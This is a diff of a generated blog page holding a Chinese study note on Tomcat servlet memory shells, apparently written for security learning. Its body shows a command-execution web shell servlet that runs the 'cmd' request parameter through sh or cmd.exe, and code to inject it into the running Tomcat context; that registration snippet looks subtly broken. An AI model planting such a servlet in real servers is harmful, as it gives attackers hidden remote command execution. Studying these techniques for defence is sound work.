@@ -28,7 +28,7 @@
   <meta name="description" content="内存马学习笔记（二）severlet内存马还是那两句话  Servlet、Listener、Filter 由 javax.servlet.ServletContext 去加载   Servlet 3.0 API 允许使 ServletContext 用动态进行注册  先分析流程createstandard  context&#x3D;StandardEngine[Catalina].Standar">
 <meta property="og:type" content="article">
 <meta property="og:title" content="内存马学习笔记（二）">
-<meta property="og:url" content="https://hanggerui88.github.io/2024/03/17/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/index.html">
+<meta property="og:url" content="https://hanggerui88.github.io/2024/03/17/java/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/index.html">
 <meta property="og:site_name" content="Blog">
 <meta property="og:description" content="内存马学习笔记（二）severlet内存马还是那两句话  Servlet、Listener、Filter 由 javax.servlet.ServletContext 去加载   Servlet 3.0 API 允许使 ServletContext 用动态进行注册  先分析流程createstandard  context&#x3D;StandardEngine[Catalina].Standar">
 <meta property="og:locale" content="en_US">
@@ -184,11 +184,11 @@
 
         <div id="content" class="outer">
           
-          <section id="main"><article id="post-内存马学习笔记（二）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+          <section id="main"><article id="post-java/内存马学习笔记（二）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner">
     <div class="article-meta">
       <div class="article-date wow slideInLeft">
-  <a href="/2024/03/17/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/" class="article-date-link">
+  <a href="/2024/03/17/java/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/" class="article-date-link">
     <time datetime="2024-03-17T13:18:08.000Z" itemprop="datePublished">2024-03-17</time>
   </a>
 </div>
@@ -201,10 +201,10 @@
 
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="内存马学习笔记（二）"><a href="#内存马学习笔记（二）" class="headerlink" title="内存马学习笔记（二）"></a>内存马学习笔记（二）</h1><h2 id="severlet内存马"><a href="#severlet内存马" class="headerlink" title="severlet内存马"></a>severlet内存马</h2><p>还是那两句话</p>
+        <h1><span id="内存马学习笔记二">内存马学习笔记（二）</span></h1><h2><span id="severlet内存马">severlet内存马</span></h2><p>还是那两句话</p>
 <p> Servlet、Listener、Filter 由 <code>javax.servlet.ServletContext</code> 去加载 </p>
 <p> Servlet 3.0 API 允许使 ServletContext 用动态进行注册 </p>
-<h3 id="先分析流程"><a href="#先分析流程" class="headerlink" title="先分析流程"></a>先分析流程</h3><p>createstandard  context&#x3D;StandardEngine[Catalina].StandardHost[localhost].StandardContext[&#x2F;tomcat_war]</p>
+<h3><span id="先分析流程">先分析流程</span></h3><p>createstandard  context&#x3D;StandardEngine[Catalina].StandardHost[localhost].StandardContext[&#x2F;tomcat_war]</p>
 <blockquote>
 <p>catalina 就是Tomcat服务器使用的 Apache实现的servlet容器的 名字。</p>
 <p>Tomcat的核心分为3个部分: </p>
@@ -219,7 +219,7 @@
 <p>在servelet装载前  org.apache.catalina.core.StandardContext#startInternal()中表明了Tomcat启动加载的顺序：Listener -&gt; Filter -&gt; Servlet </p>
 <p>同时也要注意这里的<code> loadOnStartup</code>,对于他我们需要满足一些条件</p>
 </blockquote>
-<h3 id="写exp"><a href="#写exp" class="headerlink" title="写exp"></a>写exp</h3><p>先创立一个恶意的servlet</p>
+<h3><span id="写exp">写exp</span></h3><p>先创立一个恶意的servlet</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Servlet servlet = new Servlet() &#123;</span><br><span class="line">            public void init(ServletConfig config) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            public ServletConfig getServletConfig() &#123;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException &#123;</span><br><span class="line">                String cmd = req.getParameter(&quot;cmd&quot;);</span><br><span class="line">                boolean isLinux=true;</span><br><span class="line">                String property = System.getProperty(&quot;os.name&quot;);</span><br><span class="line">                //获取当前操作系统的名字，property财产，所有物</span><br><span class="line">                if(property!=null&amp;&amp;property.toLowerCase().contains(&quot;win&quot;))&#123;</span><br><span class="line">                    isLinux=false;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? new String[]&#123;&quot;bin/sh&quot;, &quot;-c&quot;, cmd&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;;</span><br><span class="line">                //利用“bin/sh”下的解释器，参数是 -c，表示后面的参数将已命名执行，执行的命令是ps -ef | grep java，查看所有进程，利用管道符把结果传给右边</span><br><span class="line">                InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                //getinputstream()用来读取输出结果</span><br><span class="line">                Scanner scanner = new Scanner(inputStream).useDelimiter(&quot;\\a&quot;);</span><br><span class="line">                String s = scanner.hasNext() ? scanner.next() : &quot;&quot;;</span><br><span class="line">                PrintWriter writer = res.getWriter();</span><br><span class="line">                writer.println(s);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            public String getServletInfo() &#123;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
 
 <p>servletcontext#addservlet被ApplicationContextFacade调用，根本是在ApplicationContext类实现</p>
@@ -231,7 +231,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">StandardContext servletContext = (StandardContext)req.getSession().getServletContext();</span><br><span class="line">     Wrapper mywrapper = servletContext.createWrapper();</span><br><span class="line">     mywrapper.setName(&quot;mywapper&quot;);</span><br><span class="line">     mywrapper.setServletClass(servletContext.getClass().getName());</span><br><span class="line">     mywrapper.setLoadOnStartup(1);</span><br><span class="line">     // 设置为1才会将Servlet添加至容器</span><br><span class="line">     // 当值为0或者大于0时，表示容器在应用启动时就加载这个servlet；读取 web.xml中的每个Servlet 或者新建Servlet 默认是 -1</span><br><span class="line">     mywrapper.setServlet((Servlet) servletContext);</span><br></pre></td></tr></table></figure>
 
 <blockquote>
-<p>正常时wrapper装载到context,而我们是把当前context装载到<font color='red'>mywrapper</font></p>
+<p>正常时wrapper装载到context,而我们是把当前context装载到<font color="red">mywrapper</font></p>
 </blockquote>
 <p>但是现在的wrapper并不在  StandardContext 的 children 里面，可以通过 <code>StandardContext#addChild</code> 把它加到 StandardContext 的 children 当中。</p>
 <blockquote>
@@ -248,7 +248,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://hanggerui88.github.io/2024/03/17/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/" data-id="cltws5i380005swhq5dm33kwl" data-title="内存马学习笔记（二）" class="article-share-link">Share</a>
+      <a data-url="https://hanggerui88.github.io/2024/03/17/java/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/" data-id="clv7lhzwr0001fshq074odgvr" data-title="内存马学习笔记（二）" class="article-share-link">Share</a>
       
       
       
@@ -271,7 +271,7 @@
             <img data-src="/images/banner.jpg" data-sizes="auto" alt="" class="lazyload">
           
         
-        <a href="/2024/04/05/1/"></a>
+        <a href="/2024/04/05/vblog/1/"></a>
         <div class="article-nav-caption">Newer</div>
         <h3 class="article-nav-title">
           
@@ -288,7 +288,7 @@
           <img data-src="/images/banner.jpg" data-sizes="auto" alt="内存马学习笔记" class="lazyload">
         
       
-      <a href="/2024/03/16/%E5%86%85%E5%AD%98%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"></a>
+      <a href="/2024/03/16/java/%E5%86%85%E5%AD%98%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"></a>
       <div class="article-nav-caption">Older</div>
       <h3 class="article-nav-title">
         
@@ -315,7 +315,7 @@
     
       <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
   <h3 class="toc-title">Contents</h3>
-  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">内存马学习笔记（二）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#severlet%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.1.</span> <span class="toc-text">severlet内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E5%88%86%E6%9E%90%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">先分析流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99exp"><span class="toc-number">1.1.2.</span> <span class="toc-text">写exp</span></a></li></ol></li></ol></li></ol></div>
+  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">内存马学习笔记（二）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">severlet内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.1.1.</span> <span class="toc-text">先分析流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.1.2.</span> <span class="toc-text">写exp</span></a></li></ol></li></ol></li></ol></div>
 </div>
 </div>
       <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -326,7 +326,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>Posts</div>
-    <div class="sidebar-state-number">7</div>
+    <div class="sidebar-state-number">9</div>
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
@@ -334,7 +334,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">6</div>
+    <div class="sidebar-state-number">8</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -404,10 +404,10 @@
       
         <div>
           <span class="icon-brush"></span>
-          8k
+          13.7k
           &nbsp;|&nbsp;
           <span class="icon-coffee"></span>
-          00:35
+          01:03
         </div>
       
       
@@ -434,7 +434,7 @@
     
       <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
   <h3 class="toc-title">Contents</h3>
-  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">内存马学习笔记（二）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#severlet%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.1.</span> <span class="toc-text">severlet内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E5%88%86%E6%9E%90%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">先分析流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99exp"><span class="toc-number">1.1.2.</span> <span class="toc-text">写exp</span></a></li></ol></li></ol></li></ol></div>
+  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">内存马学习笔记（二）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">severlet内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.1.1.</span> <span class="toc-text">先分析流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.1.2.</span> <span class="toc-text">写exp</span></a></li></ol></li></ol></li></ol></div>
 </div>
 </div>
       <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -445,7 +445,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>Posts</div>
-    <div class="sidebar-state-number">7</div>
+    <div class="sidebar-state-number">9</div>
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
@@ -453,7 +453,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">6</div>
+    <div class="sidebar-state-number">8</div>
   </div>
 </div>
 <div class="sidebar-social">
